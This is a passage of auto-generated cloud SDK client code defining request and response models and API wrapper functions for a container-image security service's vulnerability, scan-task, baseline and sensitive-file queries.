  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageFixTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageFixTask(request: DescribeImageFixTaskRequest): DescribeImageFixTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageFixTaskWithOptions(request, runtime);
}

model DescribeImageGroupedVulListRequest {
  aliasName?: string(name='AliasName'),
  clusterId?: string(name='ClusterId'),
  currentPage?: int32(name='CurrentPage'),
  cveId?: string(name='CveId'),
  groupId?: string(name='GroupId'),
  imageDigest?: string(name='ImageDigest'),
  imageLayer?: string(name='ImageLayer'),
  imageTag?: string(name='ImageTag'),
  isLatest?: int32(name='IsLatest'),
  lang?: string(name='Lang'),
  name?: string(name='Name'),
  necessity?: string(name='Necessity'),
  pageSize?: int32(name='PageSize'),
  patchId?: long(name='PatchId'),
  repoId?: string(name='RepoId'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  repoRegionId?: string(name='RepoRegionId'),
  scanRange?: [ string ](name='ScanRange'),
  type?: string(name='Type'),
  uuids?: string(name='Uuids'),
}

model DescribeImageGroupedVulListResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName'),
      asapCount?: int32(name='AsapCount'),
      gmtLast?: long(name='GmtLast'),
      lastScanTime?: long(name='LastScanTime'),
      laterCount?: int32(name='LaterCount'),
      name?: string(name='Name'),
      nntfCount?: int32(name='NntfCount'),
      status?: int32(name='Status'),
      tags?: string(name='Tags'),
      type?: string(name='Type'),
    }
  ](name='GroupedVulItems'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeImageGroupedVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageGroupedVulListResponseBody(name='body'),
}

async function describeImageGroupedVulListWithOptions(request: DescribeImageGroupedVulListRequest, runtime: Util.RuntimeOptions): DescribeImageGroupedVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.isLatest)) {
    query['IsLatest'] = request.isLatest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.patchId)) {
    query['PatchId'] = request.patchId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageGroupedVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageGroupedVulList(request: DescribeImageGroupedVulListRequest): DescribeImageGroupedVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageGroupedVulListWithOptions(request, runtime);
}

model DescribeImageInfoListRequest {
  uuids?: string(name='Uuids'),
}

model DescribeImageInfoListResponseBody = {
  imageInfos?: [ 
    {
      alarmCount?: int32(name='AlarmCount'),
      alarmStatus?: string(name='AlarmStatus'),
      digest?: string(name='Digest'),
      endpoints?: string(name='Endpoints'),
      imageCreate?: long(name='ImageCreate'),
      imageId?: string(name='ImageId'),
      imageSize?: long(name='ImageSize'),
      imageUpdate?: long(name='ImageUpdate'),
      instanceId?: string(name='InstanceId'),
      regionId?: string(name='RegionId'),
      registryType?: string(name='RegistryType'),
      repoId?: string(name='RepoId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      repoType?: string(name='RepoType'),
      riskStatus?: string(name='RiskStatus'),
      status?: string(name='Status'),
      tag?: string(name='Tag'),
      tagImmutable?: int32(name='TagImmutable'),
      uuid?: string(name='Uuid'),
      vulCount?: int32(name='VulCount'),
      vulStatus?: string(name='VulStatus'),
    }
  ](name='ImageInfos'),
  requestId?: string(name='RequestId'),
}

model DescribeImageInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInfoListResponseBody(name='body'),
}

async function describeImageInfoListWithOptions(request: DescribeImageInfoListRequest, runtime: Util.RuntimeOptions): DescribeImageInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageInfoList(request: DescribeImageInfoListRequest): DescribeImageInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInfoListWithOptions(request, runtime);
}

model DescribeImageInstancesRequest {
  criteria?: string(name='Criteria'),
  currentPage?: int32(name='CurrentPage'),
  logicalExp?: string(name='LogicalExp'),
  pageSize?: int32(name='PageSize'),
  scanned?: boolean(name='Scanned'),
}

model DescribeImageInstancesResponseBody = {
  imageInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount'),
      alarmStatus?: string(name='AlarmStatus'),
      deployed?: int32(name='Deployed'),
      digest?: string(name='Digest'),
      endpoints?: string(name='Endpoints'),
      hcCount?: int32(name='HcCount'),
      hcStatus?: string(name='HcStatus'),
      imageCreate?: string(name='ImageCreate'),
      imageId?: string(name='ImageId'),
      imageSize?: string(name='ImageSize'),
      imageUpdate?: string(name='ImageUpdate'),
      instanceId?: string(name='InstanceId'),
      regionId?: string(name='RegionId'),
      registryType?: string(name='RegistryType'),
      repoId?: string(name='RepoId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      repoType?: string(name='RepoType'),
      riskStatus?: string(name='RiskStatus'),
      scaProgress?: int32(name='ScaProgress'),
      scaResult?: string(name='ScaResult'),
      scaStatus?: string(name='ScaStatus'),
      status?: string(name='Status'),
      tag?: string(name='Tag'),
      uuid?: string(name='Uuid'),
      vulCount?: int32(name='VulCount'),
      vulStatus?: string(name='VulStatus'),
    }
  ](name='ImageInstanceList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInstancesResponseBody(name='body'),
}

async function describeImageInstancesWithOptions(request: DescribeImageInstancesRequest, runtime: Util.RuntimeOptions): DescribeImageInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanned)) {
    query['Scanned'] = request.scanned;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageInstances(request: DescribeImageInstancesRequest): DescribeImageInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInstancesWithOptions(request, runtime);
}

model DescribeImageLatestScanTaskRequest {
  digest?: string(name='Digest'),
}

model DescribeImageLatestScanTaskResponseBody = {
  requestId?: string(name='RequestId'),
  task?: [ 
    {
      create?: string(name='Create'),
      finish?: int32(name='Finish'),
      finishTime?: long(name='FinishTime'),
      id?: long(name='Id'),
      modified?: string(name='Modified'),
      name?: string(name='Name'),
      source?: string(name='Source'),
      startTime?: long(name='StartTime'),
      status?: string(name='Status'),
      target?: string(name='Target'),
      targetType?: string(name='TargetType'),
      taskId?: string(name='TaskId'),
      taskType?: string(name='TaskType'),
    }
  ](name='Task'),
}

model DescribeImageLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageLatestScanTaskResponseBody(name='body'),
}

async function describeImageLatestScanTaskWithOptions(request: DescribeImageLatestScanTaskRequest, runtime: Util.RuntimeOptions): DescribeImageLatestScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageLatestScanTask(request: DescribeImageLatestScanTaskRequest): DescribeImageLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageLatestScanTaskWithOptions(request, runtime);
}

model DescribeImageListBySensitiveFileRequest {
  currentPage?: int32(name='CurrentPage'),
  imageDigest?: string(name='ImageDigest'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  riskLevel?: string(name='RiskLevel'),
  scanRange?: [ string ](name='ScanRange'),
  sensitiveFileKey?: string(name='SensitiveFileKey'),
}

model DescribeImageListBySensitiveFileShrinkRequest {
  currentPage?: int32(name='CurrentPage'),
  imageDigest?: string(name='ImageDigest'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  riskLevel?: string(name='RiskLevel'),
  scanRangeShrink?: string(name='ScanRange'),
  sensitiveFileKey?: string(name='SensitiveFileKey'),
}

model DescribeImageListBySensitiveFileResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  imageInfos?: [ 
    {
      digest?: string(name='Digest'),
      firstScanTime?: long(name='FirstScanTime'),
      instanceId?: string(name='InstanceId'),
      lastScanTime?: long(name='LastScanTime'),
      regionId?: string(name='RegionId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      riskLevel?: string(name='RiskLevel'),
      tag?: string(name='Tag'),
      uuid?: string(name='Uuid'),
    }
  ](name='ImageInfos'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    lastRowKey?: string(name='LastRowKey'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DescribeImageListBySensitiveFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListBySensitiveFileResponseBody(name='body'),
}

async function describeImageListBySensitiveFileWithOptions(tmpReq: DescribeImageListBySensitiveFileRequest, runtime: Util.RuntimeOptions): DescribeImageListBySensitiveFileResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageListBySensitiveFileShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListBySensitiveFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageListBySensitiveFile(request: DescribeImageListBySensitiveFileRequest): DescribeImageListBySensitiveFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListBySensitiveFileWithOptions(request, runtime);
}

model DescribeImageListWithBaselineNameRequest {
  baselineNameKey?: string(name='BaselineNameKey'),
  clusterId?: string(name='ClusterId'),
  clusterName?: string(name='ClusterName'),
  containerId?: string(name='ContainerId'),
  criteria?: string(name='Criteria'),
  criteriaType?: string(name='CriteriaType'),
  currentPage?: int32(name='CurrentPage'),
  image?: string(name='Image'),
  imageDigest?: string(name='ImageDigest'),
  lang?: string(name='Lang'),
  namespace?: string(name='Namespace'),
  pageSize?: int32(name='PageSize'),
  pod?: string(name='Pod'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeImageListWithBaselineNameResponseBody = {
  imageInfos?: [ 
    {
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      containerId?: string(name='ContainerId'),
      digest?: string(name='Digest'),
      highRiskImage?: int32(name='HighRiskImage'),
      image?: string(name='Image'),
      imageCreate?: long(name='ImageCreate'),
      imageId?: string(name='ImageId'),
      imageSize?: int32(name='ImageSize'),
      imageUpdate?: long(name='ImageUpdate'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      lastScanTime?: long(name='LastScanTime'),
      lowRiskImage?: int32(name='LowRiskImage'),
      middleRiskImage?: int32(name='MiddleRiskImage'),
      namespace?: string(name='Namespace'),
      noRiskImage?: int32(name='NoRiskImage'),
      pod?: string(name='Pod'),
      regionId?: string(name='RegionId'),
      repoId?: string(name='RepoId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      repoType?: string(name='RepoType'),
      riskStatus?: string(name='RiskStatus'),
      tag?: string(name='Tag'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
      totalItemCount?: int32(name='TotalItemCount'),
      uuid?: string(name='Uuid'),
    }
  ](name='ImageInfos'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageListWithBaselineNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListWithBaselineNameResponseBody(name='body'),
}

async function describeImageListWithBaselineNameWithOptions(request: DescribeImageListWithBaselineNameRequest, runtime: Util.RuntimeOptions): DescribeImageListWithBaselineNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListWithBaselineName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageListWithBaselineName(request: DescribeImageListWithBaselineNameRequest): DescribeImageListWithBaselineNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListWithBaselineNameWithOptions(request, runtime);
}

model DescribeImageRepoCriteriaRequest {
  value?: string(name='Value'),
}

model DescribeImageRepoCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name'),
      type?: string(name='Type'),
      values?: string(name='Values'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId'),
}

model DescribeImageRepoCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoCriteriaResponseBody(name='body'),
}

async function describeImageRepoCriteriaWithOptions(request: DescribeImageRepoCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageRepoCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoCriteria(request: DescribeImageRepoCriteriaRequest): DescribeImageRepoCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoCriteriaWithOptions(request, runtime);
}

model DescribeImageRepoDetailListRequest {
  criteria?: string(name='Criteria'),
  currentPage?: int32(name='CurrentPage'),
  logicalExp?: string(name='LogicalExp'),
  pageSize?: int32(name='PageSize'),
}

model DescribeImageRepoDetailListResponseBody = {
  imageRepoResponses?: [ 
    {
      alarmCount?: int32(name='AlarmCount'),
      alarmStatus?: string(name='AlarmStatus'),
      endpoints?: string(name='Endpoints'),
      hcCount?: int32(name='HcCount'),
      hcStatus?: string(name='HcStatus'),
      imageCount?: int32(name='ImageCount'),
      instanceId?: string(name='InstanceId'),
      regionId?: string(name='RegionId'),
      registryType?: string(name='RegistryType'),
      repoId?: string(name='RepoId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      riskStatus?: string(name='RiskStatus'),
      vulCount?: int32(name='VulCount'),
      vulStatus?: string(name='VulStatus'),
    }
  ](name='ImageRepoResponses'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageRepoDetailListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoDetailListResponseBody(name='body'),
}

async function describeImageRepoDetailListWithOptions(request: DescribeImageRepoDetailListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoDetailListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoDetailList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoDetailList(request: DescribeImageRepoDetailListRequest): DescribeImageRepoDetailListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoDetailListWithOptions(request, runtime);
}

model DescribeImageRepoListRequest {
  currentPage?: int32(name='CurrentPage'),
  fieldName?: string(name='FieldName'),
  fieldValue?: string(name='FieldValue'),
  operateType?: string(name='OperateType'),
  pageSize?: int32(name='PageSize'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  targetType?: string(name='TargetType'),
  type?: string(name='Type'),
}

model DescribeImageRepoListResponseBody = {
  addTargetCount?: int32(name='AddTargetCount'),
  allTargetCount?: int32(name='AllTargetCount'),
  delTargetCount?: int32(name='DelTargetCount'),
  imageRepoList?: [ 
    {
      flag?: string(name='Flag'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
    }
  ](name='ImageRepoList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageRepoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoListResponseBody(name='body'),
}

async function describeImageRepoListWithOptions(request: DescribeImageRepoListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoList(request: DescribeImageRepoListRequest): DescribeImageRepoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoListWithOptions(request, runtime);
}

model DescribeImageScanAuthCountResponseBody = {
  imageScan?: {
    imageScanCapacity?: long(name='ImageScanCapacity'),
    instanceId?: string(name='InstanceId'),
    scanCount?: long(name='ScanCount'),
  }(name='ImageScan'),
  requestId?: string(name='RequestId'),
}

model DescribeImageScanAuthCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthCountResponseBody(name='body'),
}

async function describeImageScanAuthCountWithOptions(runtime: Util.RuntimeOptions): DescribeImageScanAuthCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageScanAuthCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageScanAuthCount(): DescribeImageScanAuthCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageScanAuthCountWithOptions(runtime);
}

model DescribeImageScanAuthorizationResponseBody = {
  authStatus?: {
    status?: boolean(name='Status'),
  }(name='AuthStatus'),
  requestId?: string(name='RequestId'),
}

model DescribeImageScanAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthorizationResponseBody(name='body'),
}

async function describeImageScanAuthorizationWithOptions(runtime: Util.RuntimeOptions): DescribeImageScanAuthorizationResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageScanAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageScanAuthorization(): DescribeImageScanAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageScanAuthorizationWithOptions(runtime);
}

model DescribeImageSensitiveFileByKeyRequest {
  currentPage?: int32(name='CurrentPage'),
  imageUuid?: string(name='ImageUuid'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  scanRange?: [ string ](name='ScanRange'),
  sensitiveFileKey?: string(name='SensitiveFileKey'),
}

model DescribeImageSensitiveFileByKeyShrinkRequest {
  currentPage?: int32(name='CurrentPage'),
  imageUuid?: string(name='ImageUuid'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  scanRangeShrink?: string(name='ScanRange'),
  sensitiveFileKey?: string(name='SensitiveFileKey'),
}

model DescribeImageSensitiveFileByKeyResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    lastRowKey?: string(name='LastRowKey'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  sensitiveFileList?: [ 
    {
      advice?: string(name='Advice'),
      filePath?: string(name='FilePath'),
      firstScanTime?: long(name='FirstScanTime'),
      lastScanTime?: long(name='LastScanTime'),
      layerDigest?: string(name='LayerDigest'),
      promt?: string(name='Promt'),
      riskLevel?: string(name='RiskLevel'),
      sensitiveFileKey?: string(name='SensitiveFileKey'),
